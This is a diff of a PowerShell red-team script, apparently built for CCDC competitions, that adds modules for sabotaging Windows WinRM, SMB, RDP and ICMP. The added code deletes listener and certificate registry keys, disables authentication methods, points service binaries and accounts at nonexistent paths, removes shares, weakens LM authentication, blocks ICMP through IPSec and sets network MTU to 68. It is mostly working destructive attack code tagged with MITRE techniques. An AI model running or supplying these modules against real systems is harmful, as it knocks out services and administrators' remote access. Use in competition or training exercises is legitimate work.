@@ -15,11 +15,24 @@
 #              MITRE: T1489, T1565.001, T1562.004, T1222
 #              Source: CCDC_Windows_P3_MSSQL_DeadInTheWater.ps1
 #
+#   MODULE 4 -- WinRMWrecked          (Windows Remote Management)
+#              MITRE: T1489, T1562.004, T1021.006
+#
+#   MODULE 5 -- SMBShatter            (SMB / LanmanServer)
+#              MITRE: T1489, T1021.002, T1565.001
+#
+#   MODULE 6 -- RDPRuined             (Remote Desktop Protocol)
+#              MITRE: T1489, T1021.001, T1562.004
+#
+#   MODULE 7 -- ICMPDarkness          (ICMP / Ping -- IPSec + MTU)
+#              MITRE: T1562.004, T1490
+#
 # Usage:
 #   .\CCDC_Windows_P3_ServiceDestroyer.ps1                   # interactive menu
 #   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -All              # run all present roles
 #   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Modules 1,3      # specific modules
 #   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Modules Kerberos,DNS
+#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Modules WinRM,SMB,RDP,ICMP
 #   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Status           # show state only
 #   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Resume           # skip already-SUCCESS modules
 #   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Force            # re-run even SUCCESS modules
@@ -55,7 +68,9 @@ function Show-Banner {
     Write-Host " //   " -ForegroundColor Red -NoNewline
     Write-Host "P3 SERVICE DESTROYER" -ForegroundColor Yellow -NoNewline
     Write-Host "                            //" -ForegroundColor Red
-    Write-Host " //   KerberosKhaos  |  ConditionalSurrender  |  DeadInTheWater  //" -ForegroundColor Red
+    Write-Host " //   KerberosKhaos  |  ConditionalSurrender  |  DeadInTheWater   //" -ForegroundColor Red
+    Write-Host " //   WinRMWrecked   |  SMBShatter            |  RDPRuined        //" -ForegroundColor Red
+    Write-Host " //   ICMPDarkness                                                //" -ForegroundColor Red
     Write-Host " //                                                   //" -ForegroundColor Red
     Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
     Write-Host ""
@@ -95,9 +110,13 @@ function Set-ModuleState { param([string]$Name, [string]$StateVal)
 }
 
 # -- Role detection -------------------------------------------------------------
-$script:HasAD    = $null -ne (Get-Service -Name NTDS        -ErrorAction SilentlyContinue)
-$script:HasDNS   = $null -ne (Get-Service -Name DNS         -ErrorAction SilentlyContinue)
-$script:HasMSSQL = $null -ne (Get-Service -Name MSSQLSERVER -ErrorAction SilentlyContinue)
+$script:HasAD    = $null -ne (Get-Service -Name NTDS         -ErrorAction SilentlyContinue)
+$script:HasDNS   = $null -ne (Get-Service -Name DNS          -ErrorAction SilentlyContinue)
+$script:HasMSSQL = $null -ne (Get-Service -Name MSSQLSERVER  -ErrorAction SilentlyContinue)
+$script:HasWinRM = $null -ne (Get-Service -Name WinRM        -ErrorAction SilentlyContinue)
+$script:HasSMB   = $null -ne (Get-Service -Name LanmanServer -ErrorAction SilentlyContinue)
+$script:HasRDP   = $null -ne (Get-Service -Name TermService  -ErrorAction SilentlyContinue)
+# ICMP: always present -- no service gating needed
 
 # ==============================================================================
 #  MODULE 1 -- KERBEROS KHAOS  (AD/DC)
@@ -692,15 +711,428 @@ function Invoke-DeadInTheWater {
 }
 
 # ==============================================================================
+#  MODULE 4 -- WINRM WRECKED  (WinRM)
+# ==============================================================================
+function Invoke-WinRMWrecked {
+    Write-Host ""
+    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
+    Write-Host "   WinRMWrecked -- T1489/T1562.004/T1021.006" -ForegroundColor Yellow
+    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
+
+    if (-not $script:HasWinRM) {
+        Write-Warn "WinRM service not found. Skipping WinRMWrecked."
+        return
+    }
+
+    # -- Layer 1: Listener Annihilation ----------------------------------------
+    Write-Section "WinRMWrecked 1/3  Listener Annihilation"
+
+    $listenerRoot = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Listener"
+    if (Test-Path $listenerRoot) {
+        try {
+            Remove-Item -Path "$listenerRoot\*" -Recurse -Force -ErrorAction Stop
+            Write-Success "Deleted all WinRM listener registry keys under $listenerRoot"
+        } catch {
+            Write-Err "Failed to delete listener keys: $_"
+        }
+    } else {
+        Write-Warn "WinRM Listener registry root not found -- may already be clean: $listenerRoot"
+    }
+
+    & winrm.cmd set winrm/config '@{MaxEnvelopeSizekb="1"}' 2>$null | Out-Null
+    if ($LASTEXITCODE -eq 0) {
+        Write-Success "MaxEnvelopeSizekb set to 1 -- all SOAP messages rejected as oversized"
+    } else {
+        Write-Warn "winrm set MaxEnvelopeSizekb failed (rc=$LASTEXITCODE) -- WinRM may already be broken"
+    }
+
+    # -- Layer 2: Authentication Blackout --------------------------------------
+    Write-Section "WinRMWrecked 2/3  Authentication Blackout"
+
+    $wsmanSvcKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Service"
+    $authProps   = @("BasicAuth", "DigestAuthentication", "NegotiateAuthentication", "KerberosAuthentication", "CertificateAuthentication")
+    foreach ($prop in $authProps) {
+        try {
+            Set-ItemProperty -Path $wsmanSvcKey -Name $prop -Value 0 -Type DWord -ErrorAction Stop
+            Write-Success "  $prop = 0"
+        } catch {
+            Write-Warn "  Failed to set ${prop}: $_"
+        }
+    }
+    Write-Info "All WinRM auth methods disabled -- even a restored listener cannot authenticate"
+
+    # -- Layer 3: Service Account + Binary Corruption --------------------------
+    Write-Section "WinRMWrecked 3/3  Service Account + Binary Corruption"
+
+    $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\WinRM"
+    try {
+        Set-ItemProperty -Path $svcKey -Name "ObjectName" -Value ".\NonExistentUser2019" -ErrorAction Stop
+        Write-Success "WinRM ObjectName set to .\NonExistentUser2019"
+    } catch {
+        Write-Err "Failed to corrupt WinRM ObjectName: $_"
+    }
+    try {
+        Set-ItemProperty -Path $svcKey -Name "ImagePath" -Value "C:\NonExistent\svchost.exe" -ErrorAction Stop
+        Write-Success "WinRM ImagePath corrupted to C:\NonExistent\svchost.exe"
+    } catch {
+        Write-Err "Failed to corrupt WinRM ImagePath: $_"
+    }
+    try {
+        Stop-Service -Name WinRM -Force -ErrorAction Stop
+        Write-Success "WinRM service stopped"
+    } catch {
+        Write-Warn "Could not stop WinRM: $_"
+    }
+    try {
+        Set-Service -Name WinRM -StartupType Disabled -ErrorAction Stop
+        Write-Success "WinRM StartupType set to Disabled"
+    } catch {
+        Write-Warn "Could not disable WinRM startup: $_"
+    }
+
+    Write-Success "WinRMWrecked complete -- all 3 layers applied"
+    Write-Info "  L1: Restore listener keys + reset MaxEnvelopeSizekb (winrm quickconfig)"
+    Write-Info "  L2: Re-enable auth methods in HKLM:\...\WSMAN\Service"
+    Write-Info "  L3: Restore ObjectName/ImagePath for WinRM service, re-enable + restart"
+}
+
+# ==============================================================================
+#  MODULE 5 -- SMB SHATTER  (SMB / LanmanServer)
+# ==============================================================================
+function Invoke-SMBShatter {
+    Write-Host ""
+    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
+    Write-Host "   SMBShatter -- T1489/T1021.002/T1565.001" -ForegroundColor Yellow
+    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
+
+    if (-not $script:HasSMB) {
+        Write-Warn "LanmanServer service not found. Skipping SMBShatter."
+        return
+    }
+
+    # -- Layer 1: Protocol Kill + Share Destruction ----------------------------
+    Write-Section "SMBShatter 1/3  Protocol Kill + Share Destruction"
+
+    $lanParams = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
+    try {
+        Set-ItemProperty -Path $lanParams -Name "SMB2" -Value 0 -Type DWord -ErrorAction Stop
+        Write-Success "SMB2 disabled in registry (LanmanServer\Parameters\SMB2 = 0)"
+    } catch {
+        Write-Err "Failed to disable SMB2 in registry: $_"
+    }
+    try {
+        Set-SmbServerConfiguration -EnableSMB1Protocol $false -EnableSMB2Protocol $false -Force -ErrorAction Stop
+        Write-Success "Set-SmbServerConfiguration: SMB1 and SMB2 both disabled"
+    } catch {
+        Write-Warn "Set-SmbServerConfiguration failed: $_ -- registry path already applied"
+    }
+
+    Write-Info "Removing all non-admin SMB shares..."
+    try {
+        $userShares = Get-SmbShare -ErrorAction SilentlyContinue | Where-Object { $_.Special -eq $false }
+        if ($userShares) {
+            foreach ($share in $userShares) {
+                try {
+                    Remove-SmbShare -Name $share.Name -Force -ErrorAction Stop
+                    Write-Success "  Removed share: $($share.Name)"
+                } catch {
+                    Write-Warn "  Could not remove share $($share.Name): $_"
+                }
+            }
+        } else {
+            Write-Info "No non-admin shares found to remove"
+        }
+    } catch {
+        Write-Warn "Share enumeration failed: $_"
+    }
+
+    # -- Layer 2: Connection Capacity + Auth Paradox ---------------------------
+    Write-Section "SMBShatter 2/3  Connection Capacity + Auth Paradox"
+
+    $capacityProps = @(
+        @{ Name = "MaxMpxCt";        Value = 1 },
+        @{ Name = "MaxWorkItems";    Value = 1 },
+        @{ Name = "MaxRawWorkItems"; Value = 1 }
+    )
+    foreach ($p in $capacityProps) {
+        try {
+            Set-ItemProperty -Path $lanParams -Name $p.Name -Value $p.Value -Type DWord -ErrorAction Stop
+            Write-Success "  $($p.Name) = $($p.Value) (connection capacity strangled)"
+        } catch {
+            Write-Warn "  Failed to set $($p.Name): $_"
+        }
+    }
+
+    $lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
+    try {
+        Set-ItemProperty -Path $lsaKey -Name "LmCompatibilityLevel" -Value 0 -Type DWord -ErrorAction Stop
+        Write-Success "LmCompatibilityLevel = 0 (LM-only responses -- rejected by all modern clients)"
+    } catch {
+        Write-Err "Failed to set LmCompatibilityLevel: $_"
+    }
+    try {
+        Set-ItemProperty -Path $lsaKey -Name "RestrictAnonymous" -Value 2 -Type DWord -ErrorAction Stop
+        Write-Success "RestrictAnonymous = 2"
+    } catch {
+        Write-Err "Failed to set RestrictAnonymous: $_"
+    }
+    try {
+        Set-ItemProperty -Path $lsaKey -Name "RestrictAnonymousSAM" -Value 1 -Type DWord -ErrorAction Stop
+        Write-Success "RestrictAnonymousSAM = 1 (LM-only + anonymous restriction = auth paradox)"
+    } catch {
+        Write-Err "Failed to set RestrictAnonymousSAM: $_"
+    }
+
+    # -- Layer 3: Service Account + Binary Corruption + Stop -------------------
+    Write-Section "SMBShatter 3/3  Service Account + Binary Corruption + Stop"
+
+    $smbSvcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer"
+    try {
+        Set-ItemProperty -Path $smbSvcKey -Name "ObjectName" -Value ".\NonExistentUser2019" -ErrorAction Stop
+        Write-Success "LanmanServer ObjectName set to .\NonExistentUser2019"
+    } catch {
+        Write-Err "Failed to corrupt LanmanServer ObjectName: $_"
+    }
+    try {
+        Set-ItemProperty -Path $smbSvcKey -Name "ImagePath" -Value "C:\NonExistent\svchost.exe" -ErrorAction Stop
+        Write-Success "LanmanServer ImagePath corrupted to C:\NonExistent\svchost.exe"
+    } catch {
+        Write-Err "Failed to corrupt LanmanServer ImagePath: $_"
+    }
+    try {
+        Stop-Service -Name LanmanServer -Force -ErrorAction Stop
+        Write-Success "LanmanServer service stopped"
+    } catch {
+        Write-Warn "Could not stop LanmanServer: $_"
+    }
+    try {
+        Set-Service -Name LanmanServer -StartupType Disabled -ErrorAction Stop
+        Write-Success "LanmanServer StartupType set to Disabled"
+    } catch {
+        Write-Warn "Could not disable LanmanServer startup: $_"
+    }
+
+    Write-Success "SMBShatter complete -- all 3 layers applied"
+    Write-Info "  L1: Re-enable SMB2 in registry + Set-SmbServerConfiguration, recreate shares"
+    Write-Info "  L2: Restore LmCompatibilityLevel=3, RestrictAnonymous=0, MaxMpxCt=50"
+    Write-Info "  L3: Restore ObjectName/ImagePath for LanmanServer, re-enable + restart"
+}
+
+# ==============================================================================
+#  MODULE 6 -- RDP RUINED  (Remote Desktop Protocol)
+# ==============================================================================
+function Invoke-RDPRuined {
+    Write-Host ""
+    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
+    Write-Host "   RDPRuined -- T1489/T1021.001/T1562.004" -ForegroundColor Yellow
+    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
+
+    if (-not $script:HasRDP) {
+        Write-Warn "TermService not found. Skipping RDPRuined."
+        return
+    }
+
+    # -- Layer 1: Port Remap + Hard Deny ---------------------------------------
+    Write-Section "RDPRuined 1/3  Port Remap + Hard Deny"
+
+    $rdpTcpKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
+    try {
+        Set-ItemProperty -Path $rdpTcpKey -Name "PortNumber" -Value 33890 -Type DWord -ErrorAction Stop
+        Write-Success "RDP PortNumber changed from 3389 to 33890"
+    } catch {
+        Write-Err "Failed to remap RDP port: $_"
+    }
+
+    $tsKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server"
+    try {
+        Set-ItemProperty -Path $tsKey -Name "fDenyTSConnections" -Value 1 -Type DWord -ErrorAction Stop
+        Write-Success "fDenyTSConnections = 1 (RDP connections hard-denied at TS layer)"
+    } catch {
+        Write-Err "Failed to set fDenyTSConnections: $_"
+    }
+
+    # -- Layer 2: Security Layer Paradox + Cert Destruction --------------------
+    Write-Section "RDPRuined 2/3  Security Layer Paradox + Cert Destruction"
+
+    try {
+        Set-ItemProperty -Path $rdpTcpKey -Name "SecurityLayer" -Value 0 -Type DWord -ErrorAction Stop
+        Write-Success "SecurityLayer = 0 (legacy RDP security -- no TLS)"
+    } catch {
+        Write-Err "Failed to set SecurityLayer: $_"
+    }
+    try {
+        Set-ItemProperty -Path $rdpTcpKey -Name "MinEncryptionLevel" -Value 4 -Type DWord -ErrorAction Stop
+        Write-Success "MinEncryptionLevel = 4 (FIPS mandatory -- conflicts with SecurityLayer=0; clients reject handshake)"
+    } catch {
+        Write-Err "Failed to set MinEncryptionLevel: $_"
+    }
+    try {
+        Set-ItemProperty -Path $rdpTcpKey -Name "UserAuthenticationRequired" -Value 1 -Type DWord -ErrorAction Stop
+        Write-Success "UserAuthenticationRequired = 1 (NLA required -- broken cert makes NLA impossible)"
+    } catch {
+        Write-Warn "Failed to set UserAuthenticationRequired: $_"
+    }
+
+    $rcmCertKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\RCM\Certificates"
+    if (Test-Path $rcmCertKey) {
+        try {
+            $certValues = (Get-Item -Path $rcmCertKey -ErrorAction SilentlyContinue).Property
+            if ($certValues) {
+                foreach ($v in $certValues) {
+                    Remove-ItemProperty -Path $rcmCertKey -Name $v -Force -ErrorAction SilentlyContinue
+                }
+                Write-Success "Deleted $($certValues.Count) RDP certificate thumbprint(s) from RCM\Certificates"
+            } else {
+                Write-Info "No existing RDP cert thumbprints found in RCM\Certificates"
+            }
+        } catch {
+            Write-Warn "Failed to clear RCM\Certificates: $_"
+        }
+    } else {
+        Write-Warn "RCM\Certificates key not found -- may regenerate on next start (harmless)"
+    }
+
+    # -- Layer 3: Service Account + Binary Corruption + Stop -------------------
+    Write-Section "RDPRuined 3/3  Service Account + Binary Corruption + Stop"
+
+    $rdpSvcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\TermService"
+    try {
+        Set-ItemProperty -Path $rdpSvcKey -Name "ObjectName" -Value ".\NonExistentUser2019" -ErrorAction Stop
+        Write-Success "TermService ObjectName set to .\NonExistentUser2019"
+    } catch {
+        Write-Err "Failed to corrupt TermService ObjectName: $_"
+    }
+    try {
+        Set-ItemProperty -Path $rdpSvcKey -Name "ImagePath" -Value "C:\NonExistent\svchost.exe" -ErrorAction Stop
+        Write-Success "TermService ImagePath corrupted to C:\NonExistent\svchost.exe"
+    } catch {
+        Write-Err "Failed to corrupt TermService ImagePath: $_"
+    }
+    try {
+        Stop-Service -Name TermService -Force -ErrorAction Stop
+        Write-Success "TermService stopped"
+    } catch {
+        Write-Warn "Could not stop TermService: $_"
+    }
+    try {
+        Set-Service -Name TermService -StartupType Disabled -ErrorAction Stop
+        Write-Success "TermService StartupType set to Disabled"
+    } catch {
+        Write-Warn "Could not disable TermService startup: $_"
+    }
+
+    Write-Success "RDPRuined complete -- all 3 layers applied"
+    Write-Info "  L1: Restore PortNumber=3389, fDenyTSConnections=0"
+    Write-Info "  L2: Restore SecurityLayer=2, MinEncryptionLevel=2, NLAEnabled=0; restart TermService to regenerate cert"
+    Write-Info "  L3: Restore ObjectName/ImagePath for TermService, re-enable + restart"
+}
+
+# ==============================================================================
+#  MODULE 7 -- ICMP DARKNESS  (ICMP / Ping)
+# ==============================================================================
+function Invoke-ICMPDarkness {
+    Write-Host ""
+    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
+    Write-Host "   ICMPDarkness -- T1562.004/T1490" -ForegroundColor Yellow
+    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
+
+    # -- Layer 1: IPSec Policy Block (firewall-independent) --------------------
+    Write-Section "ICMPDarkness 1/3  IPSec Policy Block (survives Windows Firewall toggle)"
+
+    $ipsecCmds = @(
+        @("ipsec", "static", "add", "policy", "name=CCDC_ICMPKill"),
+        @("ipsec", "static", "add", "filterlist", "name=AllICMP"),
+        @("ipsec", "static", "add", "filter", "filterlist=AllICMP", "srcaddr=any", "dstaddr=any", "protocol=icmp", "mirrored=yes"),
+        @("ipsec", "static", "add", "filteraction", "name=DropICMP", "action=block"),
+        @("ipsec", "static", "add", "rule", "name=KillICMP", "policy=CCDC_ICMPKill", "filterlist=AllICMP", "filteraction=DropICMP"),
+        @("ipsec", "static", "set", "policy", "name=CCDC_ICMPKill", "assign=yes")
+    )
+    $ipsecLabels = @(
+        "Created IPSec policy: CCDC_ICMPKill",
+        "Created filter list: AllICMP",
+        "Added ICMPv4 mirrored filter (any->any)",
+        "Added block filter action: DropICMP",
+        "Linked rule KillICMP -> AllICMP -> DropICMP",
+        "Assigned (activated) policy: CCDC_ICMPKill"
+    )
+    for ($i = 0; $i -lt $ipsecCmds.Count; $i++) {
+        & netsh.exe $ipsecCmds[$i] 2>$null | Out-Null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Success $ipsecLabels[$i]
+        } else {
+            Write-Warn "$($ipsecLabels[$i]) -- rc=$LASTEXITCODE (may already exist)"
+        }
+    }
+    Write-Info "IPSec ICMP block is independent of Windows Firewall -- survives firewall service stop/start"
+
+    # -- Layer 2: TCPIP Stack Registry Hardening --------------------------------
+    Write-Section "ICMPDarkness 2/3  TCPIP Stack Registry Hardening"
+
+    $tcpipKeys = @(
+        "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
+        "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters"
+    )
+    $tcpipProps = @(
+        @{ Name = "EnableICMPRedirect";     Value = 0 },
+        @{ Name = "PerformRouterDiscovery"; Value = 0 },
+        @{ Name = "DeadGWDetectDefault";    Value = 0 },
+        @{ Name = "DisableIPSourceRouting"; Value = 2 }
+    )
+    foreach ($keyPath in $tcpipKeys) {
+        $keyLabel = if ($keyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
+        foreach ($p in $tcpipProps) {
+            try {
+                Set-ItemProperty -Path $keyPath -Name $p.Name -Value $p.Value -Type DWord -ErrorAction Stop
+                Write-Success "  [$keyLabel] $($p.Name) = $($p.Value)"
+            } catch {
+                Write-Warn "  [$keyLabel] Failed to set $($p.Name): $_"
+            }
+        }
+    }
+
+    # -- Layer 3: Interface MTU Cripple ----------------------------------------
+    Write-Section "ICMPDarkness 3/3  Interface MTU Cripple (MTU=68 on all active NICs)"
+
+    try {
+        $adapters = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.Status -eq "Up" }
+        if ($adapters) {
+            foreach ($nic in $adapters) {
+                & netsh.exe interface ipv4 set subinterface $nic.InterfaceAlias mtu=68 store=persistent 2>$null | Out-Null
+                if ($LASTEXITCODE -eq 0) {
+                    Write-Success "  MTU=68 set on: $($nic.InterfaceAlias)"
+                } else {
+                    Write-Warn "  MTU set failed on $($nic.InterfaceAlias) (rc=$LASTEXITCODE)"
+                }
+            }
+            Write-Info "MTU=68 causes severe fragmentation -- most ICMP and real traffic cannot pass cleanly"
+        } else {
+            Write-Warn "No active adapters found -- skipping MTU cripple"
+        }
+    } catch {
+        Write-Err "Get-NetAdapter failed: $_ -- MTU layer skipped"
+    }
+
+    Write-Success "ICMPDarkness complete -- all 3 layers applied"
+    Write-Info "  L1: netsh ipsec static set policy name=CCDC_ICMPKill assign=no"
+    Write-Info "       netsh ipsec static delete policy name=CCDC_ICMPKill"
+    Write-Info "  L2: Remove registry TCPIP overrides (revert to defaults or delete the values)"
+    Write-Info "  L3: Restore MTU: netsh interface ipv4 set subinterface <alias> mtu=1500 store=persistent"
+}
+
+# ==============================================================================
 #  MENU + DISPATCH
 # ==============================================================================
 
-$script:ExecOrder = @("KerberosKhaos", "ConditionalSurrender", "DeadInTheWater")
+$script:ExecOrder = @("KerberosKhaos", "ConditionalSurrender", "DeadInTheWater", "WinRMWrecked", "SMBShatter", "RDPRuined", "ICMPDarkness")
 
 $script:ModuleDefs = @{
     "KerberosKhaos"        = @{ Num = 1; Label = "KerberosKhaos       "; Role = "AD/DC"; Present = $script:HasAD    }
     "ConditionalSurrender" = @{ Num = 2; Label = "ConditionalSurrender"; Role = "DNS  "; Present = $script:HasDNS   }
     "DeadInTheWater"       = @{ Num = 3; Label = "DeadInTheWater      "; Role = "MSSQL"; Present = $script:HasMSSQL }
+    "WinRMWrecked"         = @{ Num = 4; Label = "WinRMWrecked        "; Role = "WinRM"; Present = $script:HasWinRM }
+    "SMBShatter"           = @{ Num = 5; Label = "SMBShatter          "; Role = "SMB  "; Present = $script:HasSMB   }
+    "RDPRuined"            = @{ Num = 6; Label = "RDPRuined           "; Role = "RDP  "; Present = $script:HasRDP   }
+    "ICMPDarkness"         = @{ Num = 7; Label = "ICMPDarkness        "; Role = "ICMP "; Present = $true            }
 }
 
 function Resolve-ModuleName { param([string]$Token)
@@ -711,6 +1143,12 @@ function Resolve-ModuleName { param([string]$Token)
         "conditionalsurrender" = "ConditionalSurrender"; "surrender" = "ConditionalSurrender"
         "3"           = "DeadInTheWater";  "mssql"    = "DeadInTheWater";   "ditw" = "DeadInTheWater"
         "deadinthewater" = "DeadInTheWater"; "sql"    = "DeadInTheWater";   "dead" = "DeadInTheWater"
+        "4"           = "WinRMWrecked";    "winrm"    = "WinRMWrecked";     "wrw"  = "WinRMWrecked"
+        "winrmwrecked" = "WinRMWrecked";   "wrmwrecked" = "WinRMWrecked"
+        "5"           = "SMBShatter";      "smb"      = "SMBShatter";       "smbshatter" = "SMBShatter"
+        "6"           = "RDPRuined";       "rdp"      = "RDPRuined";        "rdpruined"  = "RDPRuined"
+        "7"           = "ICMPDarkness";    "icmp"     = "ICMPDarkness";     "icmpdarkness" = "ICMPDarkness"
+        "ping"        = "ICMPDarkness"
     }
     $key = $Token.ToLower().Trim()
     if ($aliases.ContainsKey($key)) { return $aliases[$key] }
@@ -742,7 +1180,8 @@ function Show-Menu {
     }
 
     Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
-    Write-Host "  |  [A] All present roles   [S] Status   [Q] Quit          |" -ForegroundColor Cyan
+    Write-Host "  |  [A] All present roles   [S] Status   [Q] Quit           |" -ForegroundColor Cyan
+    Write-Host "  |  Modules: 1-7, kk/cs/ditw/winrm/smb/rdp/icmp           |" -ForegroundColor Cyan
     Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
     Write-Host ""
 }
@@ -785,6 +1224,10 @@ function Invoke-Modules { param([string[]]$ToRun)
                 "KerberosKhaos"        { Invoke-KerberosKhaos        }
                 "ConditionalSurrender" { Invoke-ConditionalSurrender  }
                 "DeadInTheWater"       { Invoke-DeadInTheWater        }
+                "WinRMWrecked"         { Invoke-WinRMWrecked          }
+                "SMBShatter"           { Invoke-SMBShatter            }
+                "RDPRuined"            { Invoke-RDPRuined             }
+                "ICMPDarkness"         { Invoke-ICMPDarkness          }
             }
             Set-ModuleState $m "SUCCESS"
             $summary += [PSCustomObject]@{ Module = $m; Result = "SUCCESS"; Elapsed = "$($sw.Elapsed.ToString('mm\:ss'))" }
@@ -831,7 +1274,7 @@ if ($Modules.Count -gt 0) {
         if ($name) {
             $resolved += $name
         } else {
-            Write-Warn "Unknown module '$m' -- ignored (valid: 1/2/3, kk/cs/ditw, kerberos/dns/mssql)"
+            Write-Warn "Unknown module '$m' -- ignored (valid: 1-7, kk/cs/ditw/wrw/smb/rdp/icmp, kerberos/dns/mssql/winrm/smb/rdp/ping)"
         }
     }
     if ($resolved.Count -eq 0) {
